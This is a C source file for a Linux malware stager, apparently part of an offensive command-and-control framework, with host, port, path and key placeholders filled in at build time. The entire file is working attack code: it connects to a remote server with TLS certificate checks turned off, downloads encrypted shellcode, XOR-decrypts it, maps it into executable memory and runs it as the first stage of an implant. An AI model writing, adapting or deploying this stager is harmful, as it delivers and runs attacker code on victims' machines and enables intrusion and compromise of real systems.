/*
 * stager_linux.c — productized Linux stager.
 * Placeholders filled at generate time.
 *
 * Flow: HTTPS GET encrypted shellcode → XOR decrypt → mmap RX → jump.
 * Inner payload is the existing linux_agent shellcode (decoder stub + SO).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>

#include <openssl/ssl.h>
#include <openssl/err.h>

#define STAGER_HOST "@@STAGER_HOST@@"
#define STAGER_PORT @@STAGER_PORT@@
#define STAGER_PATH "@@STAGER_PATH@@"
#define STAGER_SSL  @@STAGER_SSL@@
#define STAGER_UA   "@@STAGER_UA@@"

static const unsigned char KEY[] = { @@STAGER_KEY@@ };

static int tcp_connect(const char *host, int port) {
    char portstr[16];
    snprintf(portstr, sizeof(portstr), "%d", port);
    struct addrinfo hints, *res = NULL, *rp;
    memset(&hints, 0, sizeof(hints));
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family = AF_UNSPEC;
    if (getaddrinfo(host, portstr, &hints, &res) != 0) return -1;
    int fd = -1;
    for (rp = res; rp; rp = rp->ai_next) {
        fd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (fd < 0) continue;
        if (connect(fd, rp->ai_addr, rp->ai_addrlen) == 0) break;
        close(fd); fd = -1;
    }
    freeaddrinfo(res);
    return fd;
}

/* Read until \r\n\r\n, return header length; also parse Content-Length if present. */
static int read_http_headers(int (*readfn)(void*, char*, int), void *ctx,
                             char *buf, int cap, long *out_clen) {
    int total = 0;
    *out_clen = -1;
    while (total < cap - 1) {
        int n = readfn(ctx, buf + total, 1);
        if (n <= 0) break;
        total += n;
        if (total >= 4 && memcmp(buf + total - 4, "\r\n\r\n", 4) == 0) {
            buf[total] = 0;
            char *p = strcasestr(buf, "Content-Length:");
            if (p) *out_clen = strtol(p + 15, NULL, 10);
            return total;
        }
    }
    return -1;
}

typedef struct { SSL *ssl; int fd; int use_ssl; } rwctx_t;

static int rw_read(void *v, char *b, int n) {
    rwctx_t *c = (rwctx_t *)v;
    if (c->use_ssl) return SSL_read(c->ssl, b, n);
    return (int)read(c->fd, b, n);
}
static int rw_write(void *v, const char *b, int n) {
    rwctx_t *c = (rwctx_t *)v;
    if (c->use_ssl) return SSL_write(c->ssl, b, n);
    return (int)write(c->fd, b, n);
}

int main(void) {
    int fd = tcp_connect(STAGER_HOST, STAGER_PORT);
    if (fd < 0) return 2;

    SSL_CTX *ctx = NULL;
    SSL *ssl = NULL;
    rwctx_t rw = {0};
    rw.fd = fd;
    rw.use_ssl = STAGER_SSL;

#if STAGER_SSL
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) { close(fd); return 3; }
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, fd);
    SSL_set_tlsext_host_name(ssl, STAGER_HOST);
    if (SSL_connect(ssl) != 1) {
        SSL_free(ssl); SSL_CTX_free(ctx); close(fd); return 4;
    }
    rw.ssl = ssl;
#endif

    char req[1024];
    int reqlen = snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Connection: close\r\n"
        "Cache-Control: no-cache\r\n"
        "\r\n",
        STAGER_PATH, STAGER_HOST, STAGER_UA);
    if (rw_write(&rw, req, reqlen) != reqlen) {
#if STAGER_SSL
        SSL_free(ssl); SSL_CTX_free(ctx);
#endif
        close(fd); return 5;
    }

    char hdr[8192];
    long clen = -1;
    int hlen = read_http_headers(rw_read, &rw, hdr, sizeof(hdr), &clen);
    if (hlen < 0) {
#if STAGER_SSL
        SSL_free(ssl); SSL_CTX_free(ctx);
#endif
        close(fd); return 6;
    }
    /* require HTTP 200 */
    if (strncmp(hdr, "HTTP/1.", 7) != 0 || !strstr(hdr, " 200 ")) {
#if STAGER_SSL
        SSL_free(ssl); SSL_CTX_free(ctx);
#endif
        close(fd); return 7;
    }

    size_t cap = (clen > 0) ? (size_t)clen : (size_t)(2 * 1024 * 1024);
    if (cap > 8 * 1024 * 1024) cap = 8 * 1024 * 1024;
    unsigned char *buf = (unsigned char *)malloc(cap);
    if (!buf) {
#if STAGER_SSL
        SSL_free(ssl); SSL_CTX_free(ctx);
#endif
        close(fd); return 8;
    }

    size_t total = 0;
    while (total < cap) {
        int n = rw_read(&rw, (char *)buf + total, (int)(cap - total));
        if (n <= 0) break;
        total += (size_t)n;
        if (clen > 0 && (long)total >= clen) break;
    }
#if STAGER_SSL
    SSL_shutdown(ssl); SSL_free(ssl); SSL_CTX_free(ctx);
#endif
    close(fd);
    if (total == 0) { free(buf); return 9; }

    for (size_t i = 0; i < total; i++) buf[i] ^= KEY[i % sizeof(KEY)];

    void *mem = mmap(NULL, total, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) { free(buf); return 10; }
    memcpy(mem, buf, total);
    free(buf);
    if (mprotect(mem, total, PROT_READ | PROT_EXEC) != 0) { munmap(mem, total); return 11; }

    ((void (*)(void))mem)();
    return 0;
}
